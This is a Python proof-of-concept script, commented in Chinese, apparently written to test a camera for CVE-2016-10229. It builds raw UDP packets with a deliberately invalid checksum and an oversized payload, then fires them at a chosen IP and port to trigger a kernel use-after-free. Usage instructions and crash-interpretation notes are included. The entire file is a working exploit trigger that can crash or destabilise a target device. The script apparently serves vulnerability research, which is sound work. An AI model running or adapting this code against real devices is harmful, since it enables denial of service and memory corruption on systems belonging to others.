#!/usr/bin/env python3
"""
CVE-2016-10229 实机触发测试 —— 发送"校验和错误"的 UDP 包。

原理：CVE-2016-10229 的 UAF 需要 (1) 相机某进程对 UDP socket 做 recv(MSG_PEEK)，
(2) 收到一个校验和错误 + 长度大于接收缓冲的 UDP 包。
本脚本负责发 (2)：伪造 UDP 头校验和 = 0xFFFF（必错），载荷 1400B（大于典型缓冲）。

结果判读：
  · 相机崩溃/重启 = UAF 被触发（说明存在 MSG_PEEK socket，P1 结论需修正）
  · 相机无反应    = MSG_PEEK 前置不成立（印证 P1 结论：dlna=MSG_DONTWAIT / psm=0）

用法（需 root，Linux 推荐；macOS raw socket 受限）：
  sudo python3 send_bad_udp.py <相机IP> <端口> [次数]
  # 端口候选：1900(SSDP) / 50001(取图) / 67(dhcp) / 60606(DLNA)
"""
import sys
import socket
import struct
import time


def ip_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def main():
    if len(sys.argv) < 3:
        print("usage: sudo %s <ip> <port> [count] [src_ip]" % sys.argv[0])
        sys.exit(1)
    dst_ip = sys.argv[1]
    dst_port = int(sys.argv[2])
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    # 宿主在相机网络上的 IP（默认相机热点 192.168.54.x 的客户端）
    src_ip = sys.argv[4] if len(sys.argv) > 4 else "192.168.54.10"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    except PermissionError:
        print("[!] 需要 root 权限（raw socket）")
        sys.exit(1)
    try:
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except OSError as e:
        print("[!] IP_HDRINCL 失败（macOS 限制 raw socket 发送）: %s" % e)
        sys.exit(1)

    payload = b"A" * 1400  # 大于常见 recv 缓冲，迫使 copied < ulen
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)

    print("[*] 目标 %s:%d，发送 %d 个坏校验和 UDP 包（载荷 %dB）" % (dst_ip, dst_port, count, len(payload)))
    for i in range(count):
        udp_len = 8 + len(payload)
        # UDP 头：校验和字段 = 0xFFFF（故意错误）
        udp = struct.pack("!HHHH", 12345, dst_port, udp_len, 0xFFFF) + payload

        ip_hdr = struct.pack("!BBHHHBBH4s4s",
                             0x45, 0, 20 + udp_len, i, 0,
                             64, socket.IPPROTO_UDP, 0, src, dst)
        cksum = ip_checksum(ip_hdr)
        ip_hdr = struct.pack("!BBHHHBBH4s4s",
                             0x45, 0, 20 + udp_len, i, 0,
                             64, socket.IPPROTO_UDP, cksum, src, dst)

        s.sendto(ip_hdr + udp, (dst_ip, 0))
        print("  [#%d] 已发坏校验和 UDP -> %s:%d" % (i, dst_ip, dst_port))
        time.sleep(0.5)

    print("[*] 完成。请观察相机：崩溃/重启 = UAF 触发；无反应 = MSG_PEEK 前置不成立。")


if __name__ == "__main__":
    main()
